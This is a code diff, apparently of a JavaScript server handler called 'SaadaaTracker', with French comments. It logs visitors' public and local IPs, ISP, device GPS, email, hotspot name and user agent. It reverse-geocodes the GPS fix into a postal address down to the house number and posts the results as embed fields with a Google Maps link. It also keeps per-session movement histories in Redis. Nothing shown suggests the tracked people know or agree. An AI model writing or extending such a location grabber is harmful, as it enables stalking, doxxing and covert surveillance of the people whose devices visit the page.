@@ -47,17 +47,42 @@ export default async function handler(req, res) {
     validatedLocalIp = "Masquée (Protégée)";
   }
 
-  // Validation stricte de la localisation précise
-  const hasGps = preciseLocation && typeof preciseLocation.lat === 'number' && typeof preciseLocation.lon === 'number' && preciseLocation.lat !== 0;
+  function normalizeCoords(lat, lon) {
+    let la = parseFloat(lat);
+    let lo = parseFloat(lon);
+    if (Number.isNaN(la) || Number.isNaN(lo)) return { lat: null, lon: null };
+    if (Math.abs(la) > 90 && Math.abs(lo) <= 90) {
+      const tmp = la;
+      la = lo;
+      lo = tmp;
+    }
+    return { lat: la, lon: lo };
+  }
 
-  let displayLocation = `${geo.city || 'Inconnue'} (${geo.regionName || ''}), ${geo.country || 'Inconnu'} [ZIP: ${geo.zip || '?'}]`;
-  let fullAddress = "Non disponible (IP uniquement)";
+  const ipCoords = normalizeCoords(geo.lat, geo.lon);
+  const ispName = geo.isp || geo.org || 'ISP inconnu';
+  const ipLocationLabel = geo.status === 'success'
+    ? `${geo.city || 'Inconnue'}, ${geo.regionName || ''}, ${geo.country || ''} (via IP / ${ispName})`.replace(/,\s*,/g, ',').trim()
+    : `Inconnue (via IP / ${ispName})`;
+
+  // Validation stricte de la localisation précise (GPS appareil)
+  const hasGps = preciseLocation
+    && typeof preciseLocation.lat === 'number'
+    && typeof preciseLocation.lon === 'number'
+    && preciseLocation.lat !== 0;
+
+  const gpsCoords = hasGps
+    ? normalizeCoords(preciseLocation.lat, preciseLocation.lon)
+    : { lat: null, lon: null };
+
+  let displayLocation = ipLocationLabel;
+  let fullAddress = ipLocationLabel;
   
   // Si on a le GPS, on essaie de trouver l'adresse complète (Reverse Geocoding)
   if (hasGps) {
     try {
       // On demande plus de détails à Nominatim pour une précision maximale (Zoom 18 est le max pour l'adresse)
-      const revRes = await fetch(`https://nominatim.openstreetmap.org/reverse?format=json&lat=${preciseLocation.lat}&lon=${preciseLocation.lon}&addressdetails=1&zoom=18`, {
+      const revRes = await fetch(`https://nominatim.openstreetmap.org/reverse?format=json&lat=${gpsCoords.lat}&lon=${gpsCoords.lon}&addressdetails=1&zoom=18`, {
         headers: { 'User-Agent': 'SaadaaTracker/1.0' }
       });
       const revData = await revRes.json();
@@ -73,19 +98,22 @@ export default async function handler(req, res) {
         const addressLine = `${houseNumber} ${road}`.trim();
         displayLocation = `📍 ${addressLine}, ${city} (${state})`;
         
-        // Construction de l'adresse postale complète ultra précise
         const parts = [addressLine, postcode, city, state, addr.country].filter(p => !!p && p.trim() !== "");
         fullAddress = parts.join(', ');
         
         if (!houseNumber) {
-            fullAddress += " (Numéro de maison non détecté - Cela dépend de la précision de votre GPS et si la maison est répertoriée sur OpenStreetMap)";
+            fullAddress += " (Numéro non détecté — précision GPS / OpenStreetMap)";
         } else {
-            fullAddress = `🏠 NUMÉRO DÉTECTÉ : ${fullAddress}`;
+            fullAddress = `🏠 ${fullAddress}`;
         }
+      } else {
+        fullAddress = `GPS : ${gpsCoords.lat}, ${gpsCoords.lon}`;
+        displayLocation = fullAddress;
       }
     } catch (e) {
       console.error("Erreur reverse géo:", e);
-      displayLocation = `✅ GPS PRÉCIS (Coordonnées OK)`;
+      fullAddress = `GPS : ${gpsCoords.lat}, ${gpsCoords.lon}`;
+      displayLocation = fullAddress;
     }
   }
 
@@ -99,10 +127,13 @@ export default async function handler(req, res) {
     localIp: validatedLocalIp,
     location: displayLocation,
     postalAddress: fullAddress,
+    ipLocation: ipLocationLabel,
     email: deviceStats?.email || null,
     hotspotName: deviceStats?.networkName || null,
-    isp: geo.isp || 'ISP inconnu',
-    coords: hasGps ? `${preciseLocation.lat}, ${preciseLocation.lon}` : `${geo.lat || '?'}, ${geo.lon || '?'}`,
+    isp: ispName,
+    coords: hasGps
+      ? `${gpsCoords.lat}, ${gpsCoords.lon}`
+      : `${ipCoords.lat ?? '?'}, ${ipCoords.lon ?? '?'}`,
     accuracy: hasGps ? preciseLocation.accuracy : null,
     deviceStats: deviceStats || {},
     isPrecise: hasGps,
@@ -130,18 +161,20 @@ export default async function handler(req, res) {
     const mapsLink = `https://www.google.com/maps?q=${cleanCoords}`;
     
     const locValue = logEntry.isPrecise 
-      ? `✅ **LOCALISATION RÉELLE (GPS)**\n**${logEntry.location}**\n\n📍 [Ouvrir dans Google Maps](${mapsLink})\nCoords: \`${logEntry.coords}\`` 
-      : `❌ IP Uniquement (Approximatif)\n**${logEntry.location}**\nCoords: \`${logEntry.coords}\``;
+      ? `✅ **GPS (appareil)**\n**${logEntry.location}**\n\n📍 [Google Maps](${mapsLink})\nCoords: \`${logEntry.coords}\`` 
+      : `⚠️ **Approximatif (IP fournisseur)**\n**${logEntry.ipLocation}**\nCoords: \`${logEntry.coords}\``;
 
     const fields = [
       { name: "🕒 Date (Paris)", value: logEntry.timestamp, inline: true },
-      { name: "🌐 IP Publique (WiFi)", value: `\`${publicIp}\``, inline: true },
-      { name: "🏠 IP Locale (Appareil)", value: `\`${validatedLocalIp}\``, inline: true },
-      { name: "📍 Localisation Précise", value: locValue }
+      { name: "🌐 IP Publique", value: `\`${publicIp}\``, inline: true },
+      { name: "🏠 IP Locale (LAN)", value: `\`${validatedLocalIp}\``, inline: true },
+      { name: "📡 Fournisseur (ISP)", value: logEntry.isp, inline: true },
+      { name: logEntry.isPrecise ? "📍 Position GPS" : "📍 Position IP (FAI)", value: locValue }
     ];
 
     if (logEntry.isPrecise) {
-      fields.push({ name: "🏠 Adresse Postale", value: `\`${logEntry.postalAddress}\`` });
+      fields.push({ name: "🏠 Adresse GPS", value: `\`${logEntry.postalAddress}\`` });
+      fields.push({ name: "🌐 Zone IP (FAI)", value: logEntry.ipLocation });
     }
 
     if (logEntry.email) {
@@ -150,10 +183,6 @@ export default async function handler(req, res) {
 
     if (logEntry.hotspotName) {
       fields.push({ name: "📶 Partage Connexion", value: `\`${logEntry.hotspotName}\``, inline: true });
-    }
-
-    if (!logEntry.isPrecise) {
-      fields.push({ name: "📡 Fournisseur (ISP)", value: logEntry.isp });
     }
 
     fields.push(
@@ -200,20 +229,30 @@ export default async function handler(req, res) {
       // 2. Historique de mouvement pour cette session
       const movementData = JSON.stringify({
         publicIp: publicIp,
-        lat: hasGps ? preciseLocation.lat : geo.lat,
-        lon: hasGps ? preciseLocation.lon : geo.lon,
+        lat: hasGps ? gpsCoords.lat : ipCoords.lat,
+        lon: hasGps ? gpsCoords.lon : ipCoords.lon,
+        ipLat: ipCoords.lat,
+        ipLon: ipCoords.lon,
         accuracy: logEntry.accuracy,
         deviceStats: logEntry.deviceStats,
         time: logEntry.timestamp,
         unixTime: logEntry.unixTime,
         isPrecise: logEntry.isPrecise,
+        geoSource: hasGps ? 'gps' : 'ip',
         localIp: validatedLocalIp,
         postalAddress: logEntry.postalAddress,
+        ipLocation: logEntry.ipLocation,
+        isp: logEntry.isp,
         email: logEntry.email,
         hotspotName: logEntry.hotspotName,
-        page: logEntry.page
+        page: logEntry.page,
+        userAgent: logEntry.userAgent
       });
       await client.rPush(`session_movement:${logEntry.sessionId}`, movementData);
+
+      if (logEntry.email) {
+        await client.set(`session_email:${logEntry.sessionId}`, logEntry.email);
+      }
       
       // 3. Liste des sessions actives
       // Les vraies visites (isUpdate=false) réactivent TOUJOURS la session
